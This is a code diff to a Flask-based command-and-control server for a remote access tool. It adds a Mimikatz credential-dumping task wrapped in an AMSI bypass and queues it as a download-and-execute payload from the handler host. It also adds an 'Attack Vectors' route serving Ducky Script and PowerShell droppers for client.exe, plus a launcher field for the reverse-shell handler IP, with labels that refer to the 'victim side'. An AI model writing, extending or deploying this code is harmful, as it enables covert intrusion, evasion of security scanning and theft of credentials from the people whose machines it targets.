@@ -166,10 +166,28 @@ def hash(password,username):
 
 ##### Auto Commands
 
-def mimikatz():
+def mimikatz(id):
     print("+-----------+")
     print("|  Mimikatz |")
     print("+-----------+")
+    payload = AmsiBypass()
+    with open('./commands_templates/mimikatz.txt',"r") as file:
+        data = file.read()
+    global handler
+    global handler_host
+    ip = handler
+    data = data.replace("%%ip%%",str(ip))
+    data = data.replace("%%port%%","1234")
+    data = data.replace("%%site%%",str(handler_host))
+    with open("./uploads/mimikatz.ps1","w") as file:
+        file.write(data)
+    payload = payload.download_and_execute_ps1(f"http://{handler_host}/download/?file=mimikatz.ps1")
+    with open('./commands_templates/Invoke-Mimikatz.ps1',"r") as file:
+        data = file.read()
+    with open("./uploads/Invoke-Mimikatz.ps1","w") as file:
+        file.write(data)
+    with open(f"./queue/{id}.txt","a") as file:
+        file.write("\n"+payload)
 
 def shell(id):
     print("+-----------+")
@@ -178,8 +196,10 @@ def shell(id):
     payload = AmsiBypass()
     with open('./commands_templates/shell.txt',"r") as file:
         data = file.read()
+    global handler
     global handler_host
-    data = data.replace("%%ip%%",str(handler_host))
+    ip = handler
+    data = data.replace("%%ip%%",str(ip))
     data = data.replace("%%port%%","1234")
     with open("./uploads/payload.ps1","w") as file:
         file.write(data)
@@ -330,6 +350,32 @@ def down():
         else:
             return ""
     return ""
+
+@app.route(f'/vectors/{admin_token}',methods=["GET","POST"])
+def vectors():
+    total_vectors = [("Ducky Script :",f'http://{host1}/vectors/{admin_token}?password={admin_password}&type=rubber'),("Basic powershell :",f'http://{host1}/vectors/{admin_token}?password={admin_password}&type=bpsh')]
+    if request.method == "GET":
+        if request.cookies.get("id")!=admin_cookie:
+            return render_template("vectors.html",error_code="Invalid Cookie, Log in")
+        if request.args.get("password"):
+            if request.args.get("password") != admin_password:
+                return render_template("vectors.html",error="Invalid Password",data=total_vectors)
+        return render_template("vectors.html",data=total_vectors)
+
+    else:
+        global handler_host
+        if request.args.get("password"):
+            if request.args.get("password") != admin_password:
+                return render_template("vectors.html",error="Invalid Password",data=total_vectors)
+        if request.args.get("type"):
+            type = request.args.get("type")
+            try:
+                with open(f"./vectors/{type}",'r') as file:
+                    data = file.read().replace("%%site%%","https://"+handler_host+"/download/?file=client.exe")
+                return data
+            except:
+                return "innexistant vector"
+
 
 @app.route("/get_id/")
 def get_id():
@@ -504,7 +550,8 @@ def account():
     live_feedb = f"http://{host1}/feedback/{admin_token}?password={admin_password}"
     file_upl = f'http://{host1}/file_upload/{admin_token}?password={admin_password}'
     edit = f'http://{host1}/edit_queue/{admin_token}?password={admin_password}'
-    content = [(command_p,"Command Panel :"),(client_p,"Client Panel :"),(live_feedb,"Live feedback :"),(file_upl,"File Upload :"),(edit,"Edit Queue :")]
+    vectors = f'http://{host1}/vectors/{admin_token}?password={admin_password}'
+    content = [(command_p,"Command Panel :"),(client_p,"Client Panel :"),(live_feedb,"Live feedback :"),(file_upl,"File Upload :"),(edit,"Edit Queue :"),(vectors,"Attack Vectors :")]
     if fail_counter == 3:
         return render_template("admin.html",error_code=f"Acces Blocked, max attempts excelled.")
     if request.method == "POST":
@@ -621,15 +668,20 @@ def set_ip():
     host_ip=ip_host.get()
     host_handler = ip_handler.get()
     port = port_handler.get()
+    handler1 = revshell_ip.get()
+    if handler1 == "":
+        handler1 = "127.0.0.1"
     if host_ip == "":
         host_ip = "0.0.0.0"
     if host_handler == "":
         host_handler = "127.0.0.1"
     if port == "":
         port ="1234"
+    global handler
     global host1
     global handler_host
     global handler_port
+    handler = handler1
     handler_port = port
     handler_host = host_handler
     host1 = host_ip
@@ -649,17 +701,20 @@ try:
         global root
         root = Tk()
         root.title("Launcher")
-        root.geometry("500x300")
+        root.geometry("500x400")
         ip_host=StringVar()
         ip_handler = StringVar()
         port_handler = StringVar()
+        revshell_ip = StringVar()
         label_big = Label(root, text="\nHost Set :", font=("Times New Roman", 35, "bold")).pack()
         label_low = Label(root, text="Set an host (default 0.0.0.0) :").pack()
         ip_ENTRY= Entry(root, textvariable=ip_host).pack()
-        label_low2 = Label(root, text="\nSet an host for the handler (default 127.0.0.1 :").pack()
+        label_low2 = Label(root, text="\nSet an host for the site (victim side):").pack()
         ip_ENTRY2= Entry(root, textvariable=ip_handler).pack()
-        label_low3 = Label(root, text="\nSet an ip for the handler (default 1234 :").pack()
+        label_low3 = Label(root, text="\nSet a port for the site (victim side:").pack()
         ip_ENTRY3= Entry(root, textvariable=port_handler).pack()
+        label_low4 = Label(root, text="\nSet an ip for the handler:").pack()
+        ip_ENTRY4= Entry(root, textvariable=revshell_ip).pack()
         submit = Button(root, text='Set Ip',command=set_ip).pack()
 
         root.protocol("WM_DELETE_WINDOW", on_closing)
